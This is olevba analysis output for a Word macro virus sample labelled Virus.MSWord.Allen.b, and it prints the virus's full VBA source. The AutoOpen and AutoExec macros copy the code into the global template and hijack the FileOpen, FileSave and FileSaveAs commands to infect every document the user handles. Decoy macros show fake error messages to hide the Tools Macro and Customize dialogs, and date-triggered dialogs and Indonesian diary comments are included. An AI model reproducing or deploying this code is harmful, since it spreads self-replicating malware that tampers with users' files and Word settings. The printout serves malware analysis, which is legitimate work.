olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiToolsCustomize.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Customizes the Word user interface (menus, keyboard and toolbars)"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiToolsCustomize.MAIN"
Dim Tiwi$
Tiwi$ = "No such customize or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileTemplates.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiFileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileTemplates.MAIN"
Dim Tiwi$
Tiwi$ = "No such template or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiToolsMacro.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiToolsMacro.MAIN"
Dim Tiwi$
Tiwi$ = "No such macro or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileSaveAs.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiFileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileSaveAs.MAIN"
Dim NFile$
Dim NMakro$
On Error GoTo -1: On Error GoTo Pratiwi
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
    dlg.Format = 1
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSaveAs dlg
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoClose.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiAutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoClose.MAIN"
Dim Intan
Dim i
Dim MN$
ReDim Fransiska__$(20)
Intan = 0
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) <> "FileOpen" Then GoTo Pakis
        On Error GoTo -1: On Error GoTo Pratiwi
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
        On Error GoTo -1: On Error GoTo Pratiwi
        WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", "Global:FileOpen"
Pakis:
    Next i
End If
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileSave.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiFileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileSave.MAIN"
Dim NFile$
Dim NMakro$
On Error GoTo -1: On Error GoTo Pratiwi
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
    dlg.Format = 1
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSaveAs dlg
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileOpen.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiFileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Pratiwi
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
ReDim Fransiska__$(20)
Intan = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
FN$ = WordBasic.[FileName$]()
If Intan >= 1 Then
    For i = 1 To Intan
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=Fransiska__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSave
Pratiwi:
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoOpen.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiAutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim NFile$
Dim NMakro$
ReDim Fransiska__$(20)
Intan = 0
On Error GoTo -1: On Error GoTo Pratiwi
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) = "FileOpen" Then GoTo Pakis
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
Pakis:
    Next i
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy NMakro$, "Global:SweetPakisPratiwi"
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:AutoClose"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileOpen"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoExec.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/PakisPratiwiAutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoExec.MAIN"
Dim Tgl
Dim Bln
Dim Thn
Dim Jam
Dim Lebar
Dim Tinggi
Dim BarOK
Dim LebOK
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Tgl = WordBasic.Day(WordBasic.Now())
Bln = WordBasic.Month(WordBasic.Now())
Thn = WordBasic.Year(WordBasic.Now())
Jam = WordBasic.Hour(WordBasic.Now())
Dim Tiwi1$, Tiwi2$, Tiwi3$, Tiwi4$, Pelaku$, Pakis$
Tiwi1$ = "Berawal dari sebuah kepedihan..." + Chr(13) + "Aku dicampakkan dan dihinakan..." + Chr(13) + "Terpuruk bagaikan sampah busuk..." + Chr(13) + "Aku merintih..." + Chr(13) + "   ( dengan segumpal dendam mendidih )"
Tiwi2$ = "Kini saatnya Aku menunjukkan..." + Chr(13) + "Masih adanya sebuah kekuatan..." + Chr(13) + "Membungkam mulut-mulut tak berperasaan..." + Chr(13) + "Sebab hasrat untuk menjadi yang terbaik..." + Chr(13) + "Adalah sesuatu yang sangat manusiawi..." + Chr(13) + "Aku menangis harus melibatkan semua orang."
Tiwi3$ = "©1997 Aku ( yang selalu terpuruk ... )"
Pakis$ = "Pakis Pratiwi"
If Thn < 1998 Then GoTo Fransiska
If Jam < 19 Then GoTo Pratiwi
Dim dlg As Object
    Lebar = 400
    Tinggi = 200
    BarOK = Tinggi - 25
    LebOK = Lebar - 40
    WordBasic.BeginDialog Lebar, Tinggi, " Come to where the fucker is ... "
        WordBasic.Text 20, 10, LebOK, 150, Tiwi1$
        WordBasic.Text 20, 78, LebOK, 120, Tiwi2$
        WordBasic.Text 20, 160, LebOK, 20, Tiwi3$
        WordBasic.OKButton 20, BarOK, LebOK, 20
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog dlg
Fransiska:
If Tgl = 19 And Bln = 8 Then
    Pelaku$ = Pakis$
    GoTo Intan
End If
GoTo Pakis_
Intan:
    Tiwi4$ = "Buat : " + Pelaku$ + " ( dimanapun kamu ! )" + Chr(13) + Chr(13) + "     Selamat ya !!!" + Chr(13) + "          Tambah umur..." + Chr(13) + "          Tambah dewasa..." + Chr(13) + "     Tambah cakep..." + Chr(13) + Chr(13) + "Dari : Aku ( yang peduli sama kamu ! )"

    WordBasic.Beep
    WordBasic.MsgBox Tiwi4$, "Happy Birthday, " + Pelaku$ + "...", 16
    GoTo Intan
Pakis_:
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1
WordBasic.ToolsOptionsUserInfo Name:="Pakis Pratiwi", Initials:="Tiwi", Address:="Pupus sudah asa Aku mencari" + Chr(13) + "Alamat nyata belum jua terberi" + Chr(13) + "Kalau saudaraku sudi memberi" + Chr(13) + "Informasi Aku menanti" + Chr(13) + "Seribu hatur kasih Aku pasti"
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO SweetPakisPratiwi.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/SweetPakisPratiwi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.SweetPakisPratiwi.MAIN"
'
'Cuplikan diary ini adalah kejadian nyata perjalanan hidupku.
'Satu harapan besarku, semoga Tiwi tahu segala perasaanku.
'Semoga...
'
'============================================='
'Catatan :                                  '
'Beberapa bagian dari diary ini telah disensor'
'tanpa mengurangi makna dan isinya.           '
'============================================='
'-------------------------------
'Date : July 5, 1995
'Time : 9:08 p.m.
'Pagi  test ********, kelihatannya suksessss... ketemu sama  ****,
'Sorenya  latihan  ke *********, kemudian ke  ****,  pertama  kali
'ketemu  sama  Tiwi (katanya adiknya *****  (?))...  dianya  manis
'lho.... swear!
'-------------------------------
'Date : July 9, 1995
'Time : 8:11 p.m.
'Tragedi  ******... Dapet juara *, Rp *****,-...  penempatan  kaki
'kurang bagus... kenalan sama Tiwi, adiknya *****. Sekarang  ngan-
'tuk !!!
'-------------------------------
'Date : August 30, 1995
'Time : 7:15 p.m.
'Nggak  ada  yang berkesan di hari ini selain sepi  dan  sepi  dan
'sepi...  Ah nasib. Tapi mengapa aku harus menyesali nasib ?  Yang
'jelas aku masih menyimpan rasa sayang sama Tiwi. Itu saja.
'-------------------------------
'Date : March 21, 1996
'Time : 8:53 p.m.
'Nelpon  ****  nggak ada, nelpon Tiwi udah bobo',  ya  udah  dech,
'sekarang belajar... biar besok sukses !!! Semoga.
'*** Buat apa sih hidup terlalu lurus ????? ***
'*** Karena hidup nggak sesederhana itu !!! ***
'*** Sekali-kali jadi bajingan apa salahnya ???? ***
'-------------------------------
'Date : August 19, 1996
'Time : 8:33 p.m.
'Hari ini Tiwi ulang tahun yang ke **... selamat ya !!!
'Tambah umur...
'Tambah dewasa...
'Tambah cakep...
'... OK ! ...
'Selainnya itu ... nggak ada temen... sepi !!!
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.b-f9fcf9e82f7c52f2b8597f47d2f7af56429a298e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim NFile$
Dim NMakro$
ReDim Fransiska__$(20)
Intan = 0
On Error GoTo -1: On Error GoTo Pratiwi
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) = "FileOpen" Then GoTo Pakis
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
Pakis:
    Next i
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy NMakro$, "Global:SweetPakisPratiwi"
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:AutoClose"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileOpen"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
Pratiwi:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |N,"                 |Tiwi                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

